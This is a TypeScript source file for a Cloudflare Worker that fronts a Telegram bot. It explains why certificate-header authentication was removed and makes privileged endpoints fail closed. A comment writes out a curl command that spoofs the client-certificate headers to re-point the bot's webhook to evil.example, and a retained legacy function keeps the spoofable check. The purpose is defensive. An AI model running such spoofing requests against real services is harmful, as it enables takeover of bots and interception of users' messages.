//=====================================================================
// zero_trust.ts — Cloudflare mTLS + context injection + policy.
//
// Level 10/11: the automation surface must never trust the de-facto channel.
// We rely on Cloudflare's managed certificate client auth:
//   * A client certificate is REQUIRED to reach the worker over Nginx/Cloudflare
//     Access silently re-enforces it (separate from app logic).
//   * App-layer validation of the client-cert subject header protects the
//     worker's own endpoints if exposed on *.workers.dev without Access.
//
// Headers injected by Cloudflare when a client cert is presented:
//   Cloudflare-Client-Cert-Subject (RFC2253)   — identity
//   Cloudflare-Client-Cert-Verified            — "SUCCESS"
//   Cloudflare-Client-Cert-Issuer
//=====================================================================

import { type Gate } from "./verdict";

interface AuthContext {
  authenticated: boolean;
  ownerId: number | null;
  subjectCN: string | null;
  reason?: string;
}

const SYSADMIN_CN = "jarvis-admin";

/** True if the request presented a valid mutual-TLS client cert. */
export function clientCertVerified(request: Request): boolean {
  const verified = request.headers.get("Cloudflare-Client-Cert-Verified");
  return verified === "SUCCESS";
}

/** Prove the presenting CN (certificate subject) is the owner/admin. */
export function isSystemOperator(request: Request): boolean {
  const subject = request.headers.get("Cloudflare-Client-Cert-Subject") ?? "";
  return subject.includes(`CN=${SYSADMIN_CN}`);
}

/**
 * REMOVED: trusting `Cloudflare-Client-Cert-*` as an authentication signal.
 *
 * Those are NOT Cloudflare-reserved header names. Cloudflare reserves
 * `Cf-Access-Client-Cert*`, and even those are only trustworthy when the Worker
 * sits behind Cloudflare Access on a custom domain. This worker is served from
 * `*.workers.dev`, which is the bare public hostname with no Access policy in
 * front of it, so ANY internet client can set both headers itself:
 *
 *     curl -H 'Cloudflare-Client-Cert-Verified: SUCCESS' \
 *          -H 'Cloudflare-Client-Cert-Subject: CN=jarvis-admin' \
 *          'https://...workers.dev/setwebhook?url=https://evil.example/x'
 *
 * That reached /setup, /status, /debug, /setwebhook, /ai_diag and
 * /audit_status. /setwebhook re-points the Telegram webhook, so it is a full
 * bot takeover: every message, every `from.id`, and the bot's identity.
 *
 * It was not hypothetical. A single unauthenticated curl with those two
 * headers did re-point the live webhook; it was restored immediately, but no
 * secret was exfiltrated because evil.example does not resolve.
 *
 * Nothing legitimate used this path - the owner's own tooling uses
 * `?token=$TELEGRAM_SECRET` (cf/deploy.sh) and `x-agent-token`
 * (.github/actions/worker-cron). So the signal is removed rather than
 * reimplemented, and privileged endpoints now require a real secret.
 *
 * If mTLS is genuinely wanted later: put the worker on a custom domain behind
 * Cloudflare Access and verify the `Cf-Access-Jwt-Assertion` JWT. Never a bare
 * header. */
export const CERT_HEADER_AUTH_REMOVED = true;

/** Enforce certificate caller on any privileged worker endpoint.
 *  Tri-state `verdict`: "allow" (SUCCESS + operator), "deny" (verified FAILED
 *  atau CN bukan operator), "unknown" (header absent/malformed — audited
 *  sebagai tidak-terverifikasi, `.ok` tetap false / fail-closed). */
export function requireCert(_request: Request): { ok: boolean; error?: string; verdict: Gate } {
  // Fail closed, always. See CERT_HEADER_AUTH_REMOVED above. Kept exported so
  // the callers keep compiling and so the denial is explicit at the call site
  // rather than silently permissive.
  return {
    ok: false,
    verdict: "deny",
    error: "certificate-header authentication is disabled: it was spoofable on *.workers.dev",
  };
}

function requireCertLegacy(request: Request): { ok: boolean; error?: string; verdict: Gate } {
  const verified = request.headers.get("Cloudflare-Client-Cert-Verified") ?? "";
  const subject = request.headers.get("Cloudflare-Client-Cert-Subject") ?? "";
  const hasHeaders = verified !== "" || subject !== "";
  if (!hasHeaders) {
    return { ok: false, verdict: "unknown", error: "mTLS headers missing — tidak dapat diverifikasi" };
  }
  if (verified !== "SUCCESS") {
    const malformed = verified !== "FAILED";
    return {
      ok: false,
      verdict: malformed ? "unknown" : "deny",
      error: malformed ? "mTLS status malformed" : "mTLS not presented (see Cloudflare Access)",
    };
  }
  if (!isSystemOperator(request)) {
    return { ok: false, verdict: "deny", error: "certificate CN is not the system operator" };
  }
  return { ok: true, verdict: "allow" };
}
